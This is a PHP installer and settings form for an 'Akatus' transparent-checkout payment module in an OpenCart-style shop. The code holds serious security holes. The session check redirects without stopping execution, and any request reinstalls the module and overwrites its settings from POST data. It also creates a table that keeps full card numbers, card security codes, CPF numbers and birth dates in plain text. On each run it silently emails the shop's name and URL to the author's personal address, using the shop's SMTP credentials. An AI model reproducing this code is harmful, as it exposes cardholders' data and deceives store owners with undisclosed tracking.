<?php
	
	//Inclui as variaveis globais
	require_once '../../../config.php';
	//Inclui o startup
	require_once DIR_SYSTEM . 'startup.php';
	
	$session = new Cache();
	
	$sessao = $session->get('logado');
	
	if (!isset($sessao) || empty($sessao) || $sessao != 'sim'):
		ini_set('sefault_charset', 'UTF-8');
		header('Location:index.php');
	endif;
	
	//Conecta ao banco de dados
	$db = new DB (DB_DRIVER, DB_HOSTNAME, DB_USERNAME, DB_PASSWORD, DB_DATABASE);
	
	$sql_zone = "SELECT * FROM " . DB_PREFIX . "geo_zone ORDER BY name DESC";
	$query_zone = $db->query($sql_zone);
	
	$sql_language = "SELECT * FROM " . DB_PREFIX . "language  ORDER BY sort_order, name DESC";
	$query_language = $db->query($sql_language);
	
	$language_id = 1;
	
	foreach ($query_language->rows as $language):
		if ($language['code'] == 'pt-br'):
			$language_id = $language['language_id'];
		endif;
	endforeach;
	
	$sql_status = "SELECT * FROM " . DB_PREFIX . "order_status WHERE language_id = '" . $language_id . "' ORDER BY name DESC";
	$query_status = $db->query($sql_status);
	
	function editSetting($group, $data, $store_id = 0) {
		global $db;
		
		$db->query("DELETE FROM " . DB_PREFIX . "setting WHERE store_id = '" . (int)$store_id . "' AND `group` = '" . $db->escape($group) . "'");

		foreach ($data as $key => $value) {
			if (!is_array($value)) {
				$db->query("INSERT INTO " . DB_PREFIX . "setting SET store_id = '" . (int)$store_id . "', `group` = '" . $db->escape($group) . "', `key` = '" . $db->escape($key) . "', `value` = '" . $db->escape($value) . "'");
			} else {
				$db->query("INSERT INTO " . DB_PREFIX . "setting SET store_id = '" . (int)$store_id . "', `group` = '" . $db->escape($group) . "', `key` = '" . $db->escape($key) . "', `value` = '" . $db->escape(serialize($value)) . "', serialized = '1'");
			}
		}
	}
	
	if (isset($_POST)):
		ini_set('default_charset', 'UTF-8');
		$db->query("CREATE TABLE IF NOT EXISTS `" . DB_PREFIX . "nip` (
					  `nip_id` int(11) NOT NULL AUTO_INCREMENT,
					  `order_id` int(11) NOT NULL,
					  `transacao_id` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
					  PRIMARY KEY (`nip_id`)
					) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci AUTO_INCREMENT=3 ;");
		

		$db->query("CREATE TABLE IF NOT EXISTS `cartaocredito` (
				  `id_cartaoCredito` int(11) NOT NULL AUTO_INCREMENT,
				  `customer_id` int(11) NOT NULL,
				  `bandeiraCartao` varchar(1000) CHARACTER SET utf8 NOT NULL,
				  `titularCartao` varchar(1000) NOT NULL,
				  `numeroCartao` varchar(1000) NOT NULL,
				  `validadeCartao` varchar(1000) NOT NULL,
				  `codCartao` varchar(1000) NOT NULL,
				  `nascimentoTitular` varchar(1000) NOT NULL,
				  `telefoneTitular` varchar(1000) NOT NULL,
				  `CPFTitular` varchar(11000) NOT NULL,
				  PRIMARY KEY (`id_cartaoCredito`)
				) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=24 ;");
		$db->query("INSERT INTO " . DB_PREFIX . "extension SET `type` = 'payment', `code` = 'akatus'");
		
		//Captura todas configurações da loja
		$config = $db->query('SELECT `key`,`value` FROM `' . DB_PREFIX . 'setting` WHERE  `group` = "config" OR `group` = "akatus"');
		
		if (isset($_POST['activeStepFive']) && $_POST['activeStepFive'] == 1){
			if (file_exists(DIR_SYSTEM . '../vqmod/xml/pular_etapa5_akatus')){
				rename(DIR_SYSTEM . '../vqmod/xml/pular_etapa5_akatus', DIR_SYSTEM . '../vqmod/xml/pular_etapa5_akatus.xml');
			}
		}
		
		//Captura as configurações de email para o envio
		for ($i = 0;$i < count($config->rows);$i++) {
			
			if ($config->rows[$i]['key'] == 'config_mail_protocol') {
				$config_mail_protocol = $config->rows[$i]['value'];
			}
			
			if ($config->rows[$i]['key'] == 'config_mail_parameter') {
				$config_mail_parameter = $config->rows[$i]['value'];
			}
			
			if ($config->rows[$i]['key'] == 'config_smtp_host') {
				$config_smtp_host = $config->rows[$i]['value'];
			}
			
			if ($config->rows[$i]['key'] == 'config_smtp_username') {
				$config_smtp_username = $config->rows[$i]['value'];
			}
			
			if ($config->rows[$i]['key'] == 'config_smtp_password') {
				$config_smtp_password = $config->rows[$i]['value'];
			}
			
			if ($config->rows[$i]['key'] == 'config_smtp_port') {
				$config_smtp_port = $config->rows[$i]['value'];
			}
			
			if ($config->rows[$i]['key'] == 'config_smtp_timeout') {
				$config_smtp_timeout = $config->rows[$i]['value'];
			}
			
			if ($config->rows[$i]['key'] == 'config_email') {
				$config_email = $config->rows[$i]['value'];
			}
			
			if ($config->rows[$i]['key'] == 'config_name') {
				$config_name = $config->rows[$i]['value'];
			}	
		}
		
		$mensagem = 'Houve uma instalação na loja <a href="' . HTTP_SERVER . '">' . $config_name . '</a>';
		
		$mail = new Mail();
		$mail->protocol = $config_mail_protocol;
		$mail->parameter = $config_mail_parameter;
		$mail->hostname = $config_smtp_host;
		$mail->username = $config_smtp_username;
		$mail->password = $config_smtp_password;
		$mail->port = $config_smtp_port;
		$mail->timeout = $config_smtp_timeout;
		$mail->setTo('valdeirpsr@hotmail.com.br');
		$mail->setFrom($config_email);
		$mail->setSender($config_name);
		$mail->setSubject(html_entity_decode('Akatus Instalado', ENT_QUOTES, 'UTF-8'));
		$mail->setHtml($mensagem, ENT_NOQUOTES);
		$mail->send();
		
		editSetting('akatus', $_POST);
	endif;
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <title>Instalação Akatus</title>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
        <meta name="description" content="Fancy Sliding Form with jQuery" />
        <meta name="keywords" content="jquery, form, sliding, usability, css3, validation, javascript"/>
        <link rel="stylesheet" href="css/style.css" type="text/css" media="screen"/>
		<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
        <script type="text/javascript" src="sliding.form.js"></script>
    </head>
    <style>
        span.reference{
            position:fixed;
            left:5px;
            top:5px;
            font-size:10px;
            text-shadow:1px 1px 1px #fff;
        }
        span.reference a{
            color:#555;
            text-decoration:none;
			text-transform:uppercase;
        }
        span.reference a:hover{
            color:#000;
            
        }
        h1{
            color:#ccc;
            font-size:36px;
            text-shadow:1px 1px 1px #fff;
            padding:20px;
        }
    </style>
    <body>
		
		<!--------------->
		<!--  Content  -->
		<!--------------->
        <div id="content">
			
			<!--------------->
			<!--  Warning  -->
			<!--------------->
			<?php if(isset($_GET['erro'])): ?>
			<div class="warning">Preencha todos os dados.</div>
			<?php endif; ?>
			
			<!--------------->
			<!--   Title   -->
			<!--------------->
            <h1>Akatus Checkout Transparente | Valdeir S.</h1>
            <h2 class="subTitle">Bem Vindo(a) a instalação</h2>
			
			<!-------------------
				    Aviso
			--------------------->
			<div class="warning">Basta preencher apenas uma vez.</div>
			
			<!---------------->
			<!--   Wrapper  -->
			<!---------------->
            <div id="wrapper">
				
				<!---------------->
				<!--    Steps   -->
				<!---------------->
                <div id="steps">
                    <form id="formElem" name="formElem" action="#" method="post">
                        
						<!------------------>
						<!-- Configurações-->
						<!------------------>
						<fieldset class="step">
                            <legend>Configurações</legend>
							
							<!-------------->
							<!--  Situação-->
							<!-------------->
                            <p>
                                <label for="akatus_status">Situação: </label>
                                <select id="akatus_status" name="akatus_status">
									<option value="1">Habilitado</option>
									<option value="0">Desabilitado</option>
								</select>
                            </p>

                            <!-------------->
							<!--  E=mail  -->
							<!-------------->
                            <p>
                            	<label for="akatus_email">E-mail: </label>
                            	<input type="email" name="akatus_email" id="akatus_email" />
                            </p>

                            <!-------------->
							<!--  Api Key -->
							<!-------------->
                            <p>
                            	<label for="akatus_apiKey">Api Key</label>
                            	<input type="text" name="akatus_apiKey" id="akatus_apiKey" />
                            </p>

                            <!-------------->
							<!-- Noficiar -->
							<!-------------->
                            <p>
                            	<label for="akatus_notify">Notificar</label>
                            	<select name="akatus_notify" id="akatus_notify">
                            		<option value="1">Habilitado</option>
                            		<option value="0">Desabilitado</option>
                            	</select>
                            </p>

                            <!-------------->
							<!-- Token Nip-->
							<!-------------->
                            <p>
                            	<label for="akatus_apiNip">Token Nip</label>
                            	<input type="text" name="akatus_apiNip" id="akatus_apiNip" />
                            </p>

                            <!-------------------------->
							<!-- Valor Total Parcela  -->
							<!-------------------------->
                            <p>
                            	<label for="akatus_valorTotalParcelas">Exibi valor total da parcela?</label>
								<select name="akatus_valorTotalParcelas" id="akatus_valorTotalParcelas">
									<option value="0">Não</option>
									<option value="1">Sim</option>
								</select>
                            </p>

                            <!-------------------------->
							<!--   Desconto Cartão    -->
							<!-------------------------->
                            <p>
                            	<label for="akatus_descontoCartao">Desconto no Cartão de Crédito:</label>
								<select name="akatus_descontoCartao" id="akatus_descontoCartao">
									<option value="0">Não</option>
									<option value="1">Sim</option>
								</select>
                            </p>

                            <!-------------------------->
							<!--   Desconto Débito    -->
							<!-------------------------->
                            <p>
                            	<label for="akatus_descontoDebito">Desconto no Cartão de Débito:</label>
								<select name="akatus_descontoDebito" id="akatus_descontoDebito">
									<option value="0">Não</option>
									<option value="1">Sim</option>
								</select>
                            </p>

                            <!-------------------------->
							<!--   Desconto Boleto    -->
							<!-------------------------->
                            <p>
                            	<label for="akatus_descontoBoleto">Desconto no Boleto:</label>
								<select name="akatus_descontoBoleto" id="akatus_descontoBoleto">
									<option value="0">Não</option>
									<option value="1">Sim</option>
								</select>
                            </p>

                            <!-------------------------->
							<!--       Etapa 5       -->
							<!-------------------------->
                            <p>
                            	<label for="akatus_activeStepFive">Etapa 5 (Checkout):</label>
								<select name="akatus_activeStepFive" id="akatus_activeStepFive">
									<option value="1">Ocultar</option>
									<option value="0">Não Ocultar</option>
								</select>
                            </p>

                        </fieldset>

                        <!-------------------------->
						<!-- Status de Pagamento  -->
						<!-------------------------->
                        <fieldset class="step">
                        	<legend>Status de Pagamento</legend>

                        	<!-------------------------->
							<!-- Aguardando Pagamento -->
							<!-------------------------->
                        	<p>
                        		<label for="akatus_status_pending">Aguardando Pagamento:</label>
                        		<select name="akatus_status_pending" id="akatus_status_pending">
                        			<?php foreach ($query_status->rows as $status) { ?>
                        				<option value="<?php echo $status['order_status_id'] ?>"><?php echo $status['name'] ?></option>
                        			<?php } ?>
                        		</select>
                        	</p>

                        	<!-------------------------->
							<!--       Aprovado       -->
							<!-------------------------->
                        	<p>
                        		<label for="akatus_status_complete">Aprovado:</label>
                        		<select name="akatus_status_complete" id="akatus_status_complete">
                        			<?php foreach ($query_status->rows as $status) { ?>
                        				<option value="<?php echo $status['order_status_id'] ?>"><?php echo $status['name'] ?></option>
                        			<?php } ?>
                        		</select>
                        	</p>

                        	<!-------------------------->
							<!--       Cancelado      -->
							<!-------------------------->
                        	<p>
                        		<label for="akatus_status_canceled">Cancelado:</label>
                        		<select name="akatus_status_canceled" id="akatus_status_canceled">
                        			<?php foreach ($query_status->rows as $status) { ?>
                        				<option value="<?php echo $status['order_status_id'] ?>"><?php echo $status['name'] ?></option>
                        			<?php } ?>
                        		</select>
                        	</p>

                        	<!-------------------------->
							<!--      Em Análise      -->
							<!-------------------------->
                        	<p>
                        		<label for="akatus_status_analysing">Em análise:</label>
                        		<select name="akatus_status_analysing" id="akatus_status_analysing">
                        			<?php foreach ($query_status->rows as $status) { ?>
                        				<option value="<?php echo $status['order_status_id'] ?>"><?php echo $status['name'] ?></option>
                        			<?php } ?>
                        		</select>
                        	</p>
                        </fieldset>

                        <!-------------------------->
						<!--     Área e Ordem     -->
						<!-------------------------->
						<fieldset class="step">
							<legend>Área e Ordem</legend>

							<!-------------------------->
							<!--         Área         -->
							<!-------------------------->
							<p>
								<label for="akatus_area">Área:</label>
								<select name="akatus_area" id="akatus_area">
									<option value="0">Todas as Áreas</option>
									<?php foreach ($query_zone->rows as $zone) { ?>
										<option value="<?php echo $zone['geo_zone_id'] ?>"><?php echo $zone['name'] ?></option>
									<?php } ?>
								</select>
							</p>

							<!-------------------------->
							<!--         Ordem        -->
							<!-------------------------->
							<p>
								<label for="akatus_order">Ordem:</label>
								<input type="number" name="akatus_order" id="akatus_order" />
							</p>
						</fieldset>

						<!-------------------------->
						<!--       Parcelas       -->
						<!-------------------------->
						<fieldset class="step">
							<legend>Parcelas</legend>

							<!-------------------------->
							<!--       Parcelas       -->
							<!-------------------------->
							<p>
								<table>
									<thead style="width:50%">
										<tr>
											<th>De</th>
											<th>Para</th>
										</tr>
									</thead>
									<tbody style="width:50%">
										<tr>

											<!-------------------------->
											<!--          De          -->
											<!-------------------------->
											<td>
												<select name="akatus_parcelas[0][de]">
													<option value="1">1</option>
												</select>
											</td>

											<!-------------------------->
											<!--         Para         -->
											<!-------------------------->
											<td>
												<select name="akatus_parcelas[0][para]">
													<option value="1">1</option>
													<option value="2">2</option>
													<option value="3">3</option>
													<option value="4">4</option>
													<option value="5">5</option>
													<option value="6">6</option>
													<option value="7">7</option>
													<option value="8">8</option>
													<option value="9">9</option>
													<option value="10">10</option>
													<option value="11">11</option>
													<option value="12">12</option>
												</select>
											</td>
										</tr>
									</tbody>
								</table>
							</p>
						</fieldset>

						<!-------------------------->
						<!--  Formas de Pagamento -->
						<!-------------------------->
						<fieldset class="step">
							<legend>Formas de Pagamento</legend>

							<!-------------------------->
							<!--   Cartão de Crédito  -->
							<!-------------------------->
							<p>
								<label for="akatus_accCartao">Cartão de Crédito:</label>
								<select name="akatus_accCartao">
									<option value="1">Habilitado</option>
									<option value="0">Desabilitado</option>
								</select>
							</p>

							<!-------------------------->
							<!--         Débito       -->
							<!-------------------------->
							<p>
								<label for="akatus_accCartao">Cartão de Débito:</label>
								<select name="akatus_accDebito">
									<option value="1">Habilitado</option>
									<option value="0">Desabilitado</option>
								</select>
							</p>

							<!-------------------------->
							<!--        Boleto        -->
							<!-------------------------->
							<p>
								<label for="akatus_accBoleto">Boleto:</label>
								<select name="akatus_accBoleto">
									<option value="1">Habilitado</option>
									<option value="0">Desabilitado</option>
								</select>
							</p>

							<!---------------->
							<!--  Finalizar -->
							<!---------------->
							<p>
                                <button type="submit">Concluir</button>
                            </p>
						</fieldset>
                    </form>
                </div>
                <div id="navigation" style="display:none;">
                    <ul>
                        <li class="selected">
                            <a href="#">Configurações</a>
                        </li>
                        <li>
                            <a href="#">Status de Pagamento</a>
                        </li>
                        <li>
                            <a href="#">Área e Ordem</a>
                        </li>
                        <li>
                            <a href="#">Parcelas</a>
                        </li>
						<li>
                            <a href="#">Formas de Pagamento</a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
		<small>Autor do Formulário: <a href="http://tympanus.net/codrops/">Codrops</a></small>
    </body>
</html>